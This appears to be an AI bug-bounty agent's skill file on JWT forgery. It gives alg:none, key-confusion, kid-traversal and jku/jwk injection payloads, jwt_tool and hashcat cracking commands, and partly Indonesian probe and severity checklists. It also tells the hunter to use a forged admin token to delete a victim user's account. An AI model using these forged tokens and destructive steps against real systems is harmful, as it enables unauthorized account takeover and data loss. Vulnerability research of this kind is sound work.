---
name: hunt-jwt-crypto
description: "Hunt JWT cryptographic failures — alg:none signature-stripping and RS256→HS256 key-confusion that let an attacker forge a token for any identity (e.g. an admin) without knowing a secret. Use when the app authenticates with a JSON Web Token (an `eyJ...` Bearer token in the Authorization header, a cookie, or a login response). This skill OWNS JWT signature/crypto forgery (alg:none, key confusion, kid/jku header injection); hunt-ato covers JWT as one ATO path, hunt-auth-bypass covers SSO/SAML token trust, hunt-api-misconfig covers non-crypto JWT handling. Critical when a forged token grants access to another user's data or an admin-only endpoint. Also covers NON-standard/bespoke token schemes (e.g. secp256k1 signature-recovery tokens) where alg:none/key-confusion do not apply — recover the scheme from the open-source client, then differential-probe the verification model."
report_count: 6
sources: hackerone_public
---
> **appsec-fyi supplement (source-cited, 2026 CVEs):** `references/appsec-fyi-techniques.md` —
> additive per-class technique list from https://appsec.fyi. Owner methodology below still wins.

# HUNT-JWT-CRYPTO — Forgeable JSON Web Tokens (A04 Cryptographic Failures)

> **HEADER-ATTACK MATRIX:** `references/jwt-header-attack-matrix.md` — header-field × attack table
> (alg/none/HS-confusion, kid/jku/x5u/jwk/x5c, typ/cty/crit/b64 parser confusion), the full alg set to
> try, the kid sink matrix (file/SQLi/SSRF), offline secret-recovery ladder, and escalation rungs.
> Enumeration over guessing: run every header field, not just `alg:none` + `kid`.

## What actually pays

A JWT is `header.payload.signature`, each base64url. The signature is the only
thing stopping you from editing the payload (your identity/role) and replaying
it. It pays **High/Critical** when the verifier can be tricked into accepting a
token you forged — so you become another user or an admin without their secret.

Two classic, generic verifier flaws:

- **`alg:none`** — the verifier trusts the token's own `alg` header. Set
  `alg:"none"`, drop the signature, edit the payload (e.g. `role:"admin"`,
  another user's `id`/`email`). A broken verifier skips signature checking.
- **RS256 → HS256 key confusion** — the token is signed RS256 (asymmetric). The
  RSA **public** key is, by definition, public. If the verifier lets you choose
  HS256, it will use that public key as the HMAC *secret* — which you also know.
  Sign an edited payload with HS256 using the public key and it validates.

## Recon — is this app JWT-based?

```
Login/token responses containing  "token":"eyJ..."   or  Set-Cookie: token=eyJ...
Authorization: Bearer eyJ...    on authenticated requests
A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the JS bundle
```

Decode the header (base64url the first segment). `"alg":"RS256"` → try key
confusion. Any alg → always try `alg:none` first; it's free.

## Forging the token (never hand-encode base64 — use a JWT tool)

Use a purpose-built tool so encoding/signing is correct: **jwt_tool**
(`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk
public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines
of **PyJWT**. Each forge below is the concept plus the claim to edit.

**alg:none — become admin / another user**
```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```
Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` — try case variants.

**RS256 → HS256 key confusion — once you have the RSA public key**
```
1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
   /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
   bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:
      jwt_tool <token> -X k -pk public.pem
   payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
```

**kid header injection — verifier loads the HMAC key from a FILE named by `kid`**
```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
payload: {"sub":"administrator"}
```
Traverse out of the keys directory first. `kid` can also carry SQLi / command
injection / SSRF if the key lookup hits a DB / shell / URL — same idea: `kid` is
attacker-controlled and reaches a dangerous sink.

**jku / x5u header injection (RS256) — verifier fetches the public key from a URL in the token**
```
1. Host a JWKS containing a public key you control, on a server the verifier can reach.
2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload
   with YOUR matching private key.
3. If the verifier allowlists jku hosts, chain an open-redirect or SSRF-reachable
   path on the target's OWN domain so the fetch resolves to your JWKS.
```

**jwk header self-signed key injection (RS256) — embed an attacker-controlled public key in the token**
```
header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
payload: {"sub":"administrator"}
signature: (sign with your matching private key)
```
Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and use it to validate the signature. Generate your own RSA keypair, embed the public key in the token header, sign with your private key, and send. Works when the verifier does not verify the key's provenance or allowlist.

**Expiry / time-based claim manipulation**
```
Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
```
Combined with any forging technique above (alg:none, key confusion, jwk injection), this
bypasses time-based validation when the verifier does not enforce strict expiry rules.

**Cross-tenant claim injection — escalate to another tenant's data via claim swaps**
```
Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
"workspace_id", "customer_id". Edit the target claim to another tenant's value.
Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's org (e.g. 9999).
```
This is systematic IDOR via claims — if authorization logic trusts the token claims
without checking ownership server-side, you cross into another tenant's resources.
Works especially well combined with alg:none or weak-secret attacks.

Match the `payload` shape to a REAL token from the app (decode one first) — keep
its claim names, only change identity/role. A payload the app can't parse fails
for the wrong reason and wastes the attempt.

## Non-standard / bespoke token schemes — derive the model BEFORE attacking

Not every app uses JOSE. Two families:

1. **Library-signed JOSE** — everything above applies.
2. **Hand-rolled / bespoke** — custom header & payload fields, custom signature
   encoding, and a custom **verification model**. `alg:none` / key-confusion / kid /
   jku / jwk do NOT apply. Recover the scheme first, then test the model.

Recover the scheme from the client (cheapest source of truth):
- **Open-source client** (native app, crate, npm pkg) contains BOTH the token
  builder AND the server's expected claims. Grep it for the header/payload struct,
  the signing call, and the route table. The `serde rename_all` / camelCase vs
  snake_case attribute on each struct IS the wire format — check it per struct;
  one API often mixes both.
- Closed-source → pull the JS bundle: find base64 helpers + `sign` + claim names.
- Bespoke schemes often sign the RAW `header_b64 "." payload_b64` bytes with a
  non-JOSE curve (secp256k1, ed25519) and base64url WITHOUT padding. Match exactly.

Then classify the verification model by a **differential probe** — send the same
request with several token variants and read the *distinct* error strings; they
reveal the verification ORDER and model:

| variant | what a distinct error tells you |
|---|---|
| no token | header handling / 401 vs 403 |
| valid self-signed (your key, your sub) | signature accepted → proceeds to lookup |
| garbage / zero signature | is the signature verified at all? |
| `alg:none` / wrong alg | alg allowlist enforced? |
| claim carrying the pubkey **omitted** | **500 here ⇒ the server reads the token's OWN pubkey** |
| pubkey claim ≠ signing key | confirms the claim is used for verification |

**Model B — signature ADDRESS/PUBKEY RECOVERY (not forgeable).** The verifier
recovers the signer's public key from the signature, derives an identity (e.g. a
chain address), and compares it to the token's subject. You cannot produce a
signature that recovers to the victim's key — so alg:none/key-confusion are dead
ends. A response like "recovered address does not match supplied address" is Model
B and effectively **safe**: record it as a verified negative and pivot to authz.
To test anything at all here you must first **register your OWN account** through
the client's flow to get a legitimate identity + token (see the reference file).

**Static-error diagnostic (do not misread).** If valid / garbage / empty /
wrong-format inputs ALL return the *identical* error id (e.g. the same
`codeReferenceId` UUID) — on two environments even — that is a **canned, static
response** (feature-gate, block, disabled endpoint), NOT a verdict on your input.
Don't chase it as a crypto bug.

**Entitlement-ordering probe (money/credit bugs).** Before building crypto tooling
to test whether a self-minted "pending" record grants paid access, send a
deliberately INVALID body to the gated action:
- error names **entitlement** ("no active subscription") ⇒ entitlement is checked
  BEFORE body validation ⇒ your self-minted record does NOT satisfy it ⇒ hypothesis
  closed, cheaply.
- error is a **body/schema** error ⇒ body validated first; you still need a real body.
This one probe closed a whole "free paid-tier via self-minted record" lead without
writing any crypto.

See `references/custom-jwt-scheme-probe.md` for a full worked recipe (field shapes,
`exp` cap + server-time offset, camelCase pitfalls, and live-API probe hygiene).

## Offline attacks — weak HMAC secret cracking

If the token is HS256 (HMAC-based) and the secret is weak or reused from a known
password list:
```bash
# Hashcat: mode 16500 = JWT
hashcat -a 0 -m 16500 <jwt_file> rockyou.txt

# jwt_tool: built-in wordlist cracking
jwt_tool <token> -C -d wordlist.txt
```
Once the secret is cracked, forge any token using HS256 with that secret (via
jwt_tool or PyJWT).

## Automated attack automation

Use purpose-built JWT attack suites to run all known forgery modes in parallel:
```bash
# jwt_tool: auto-try alg:none, key confusion, kid injection, etc.
jwt_tool <token> -X a

# Nuclei: automated JWT vuln scanning
nuclei -u <target_url> -t jwt/ -timeout 10s
```
Run these early in JWT recon; they often find the vulnerability faster than
manual chaining of individual techniques.

## Drive to the ADMIN objective — do not stop at a working forge

A forge that loads YOUR own `/my-account` is NOT the goal — it just proves the
forge mechanism works. The objective is almost always **admin** (reach an
admin-only page and perform an admin action, e.g. delete a user). Once any forge
is accepted, IMMEDIATELY escalate — change identity to admin AND aim at the admin
endpoint. Do not keep re-forging `/my-account` or re-logging-in; that is drift.

Fixed escalation sequence (run it in order, do not loop on earlier steps):

1. Forge admin identity and hit the admin page (try these claim names — match a
   decoded real token: `sub`, `role`, `isAdmin`, `username`), e.g. an HS256 token
   with `kid` pointed at `/dev/null` and an empty secret, payload `{"sub":"administrator"}`,
   sent to `GET /admin`.
2. When `/admin` returns 200 (you'll see admin controls / a delete link), perform
   the admin action with the SAME forged token — a typical one is deleting a
   target user account, e.g. `GET /admin/delete?username=<victimuser>` (some apps
   use `POST /admin/delete` — read the admin page for the exact form/verb).

A 401 on `/admin` means the forge/claim is wrong — change ONE thing (the kid
depth, the claim name/value, or alg) and retry `/admin`. Never retreat to a bare
unauthenticated `GET /admin` (no token) — that always 401s and wastes effort.

## Proof of impact

Point the forged token at a protected/admin endpoint and prove you read data you
should not: an account/user listing (multiple users' emails), another user's
object, or a completed admin action (the deleted-user confirmation). Reading the
admin user list or performing the admin action with a forged token IS the exploit.
A 200 that returns only your own data, or a 401, is not proof.

## Validation discipline

### The two-request discrimination test (settles "is the signature actually verified?")

Do not conclude "JWT checked" from a single 401. The verdict comes from the **asymmetry between
two failures**, because a well-built API answers them with different codes:

```
A) tampered token   (payload member.id swapped, ORIGINAL signature kept)  -> 401 Unauthorized
B) alg:none         (header alg "none", empty signature)                  -> 401 Unauthorized
C) control: intact valid token, requesting ANOTHER member's object        -> 403 Forbidden
```

`A`/`B` = 401 while `C` = 403 is the proof: the verifier parses the signature **before** it makes
any authorization decision, and it can tell a forged token (authn failure) from a legitimate token
aimed at the wrong object (authz failure). If instead a tampered token reaches the same 403 as the
control, the signature is not being checked — that is your Critical. Run all three or you cannot
tell which one you have.

### Test every verb before writing "authorization holds"

`GET /resource/{id}` → 403 does **not** mean `PATCH /resource/{id}` is guarded; per-method
authorization is commonly bolted on one handler at a time. Measured on the same estate where the
JWT check was sound: `GET …/account/details/1` → 403 and `PATCH …/account/details/1` → 403 — but
that had to be REQUESTED, and the PATCH body was a real state-changing field (`{"language":"nl_NL"}`
on your own id returns 200). Always send the write verb with a benign field to your OWN id first
(proves the endpoint works and shows the response shape), then the same verb to a foreign id.

### Send the token BOTH ways

A self-hosted stack often reads the token from a cookie for the legacy app and from
`Authorization: Bearer` for the API layer, and it will not always accept both. When a token that
works in the browser fails from `requests`, set the cookie explicitly
(`S.cookies.set("<name>", tok, domain=host, path="/")`) and also try the bearer header, one at a
time. Symptom of getting this wrong: a member endpoint answers a *business* "not authorised" JSON
(`{"success":false,"shouldLogin":true}`) rather than a 401 — which reads like a missing route or a
backend error, not like an unauthenticated request.

- Decode and confirm the token you sent actually carries the edited claims.
- The win is **cross-identity data access**, not merely a 200. Show the foreign
  user data (e.g. other users' emails) in the response.
- `alg:none` rejected (401) just means that flaw is patched — try key confusion
  before concluding the app is safe.


## 2026 sweep 7 (dork pass 2026-10-18 — 1 repo)

- CVE-2026-4444 — **JWT algorithm confusion via `kid` injection**: the verification service blindly trusts the `kid` header to locate the public key, so an attacker supplies a URL pointing to their own key. Lesson: `kid` is attacker-controlled input; a key-lookup driven by it must be an allow-list, never a fetch.
  - // Attacker can inject a kid that points to their own URL
  - A JWT verification service blindly trusts the `kid` header to locate the public key, allowing an attacker to supply a URL pointing to their own key. This leads

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | `alg: none` dengan signature kosong | Paling mudah dicoba |
| 2 | RS256→HS256: tanda tangani dengan public key sebagai HMAC secret | Forge token |
| 3 | `kid` injection: path traversal / SQLi di `kid` header | Ambil key arbitrer |
| 4 | `jku`/`x5u` menunjuk ke host penyerang | Key dari URL tak tepercaya |
| 5 | Secret lemah: brute dengan wordlist (hashcat mode 16500) | HS256 dengan rahasia pendek |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa membuat token JWT dengan `alg:none` yang diterima server sebagai admin" — tunjukkan akses yang didapat.
2. **Apa yang hilang dari korban?** Akses tidak sah ke data atau aksi. Sebutkan endpoint yang berhasil diakses.
3. **Bisa direproduksi 10 menit dari nol?** Sertakan token yang di-forge dan respons server.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** palsukan/pecahkan token

**Teknik pengembangan:** alg:none / key confusion / kid injection -> jadi user lain

**Eskalasi ke:** `hunt-auth-bypass` · `hunt-ato`

**Depth target:** L3 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.



## Critical severity anchor (kelas ini bisa Critical — syaratnya)

| Bug | Severity |
|---|---|
| `alg: none` diterima | Critical — forge token apa pun |
| `alg` confusion RS256→HS256 (public key dipakai sebagai HMAC secret) | Critical |
| Signature tidak diverifikasi sama sekali | Critical |
| `kid` injection ke path file / SQL | Critical (LFI/SQLi via JWT header) |
| `jku`/`x5u` attacker-controlled tanpa allowlist | Critical |
| Claim `exp`/`nbf`/`aud` tidak dicek | High |
| Secret lemah (brute-forceable) | High-Critical tergantung klaim yang dilindungi |
| Klaim sensitif tidak di-bind ke signature (mis. `role` di body tapi tidak di-sign) | High |

**Kalibrasi:** token yang sudah expired tapi masih diterima = Medium (bukan Critical) kecuali
token itu memberi akses admin.

## 2026 sweep

- **JWK/JWKS cache tanpa rotasi** — server cache public key attacker karena `kid` cocok; kalau
  `kid` tidak di-validasi terhadap daftar internal, attacker bisa serve key-nya sendiri.
- **`aud`/`iss` tidak dicek pada multi-tenant IdP** — token dari tenant A diterima oleh tenant B.
- **JWT di URL query** — token bocor lewat referer, log, dan cache. Cek apakah token hanya di header.
- **EdDSA/ES256 `kid` path traversal** — `kid: "../../oauth/keys"` membuat server baca file lain
  sebagai verification key.
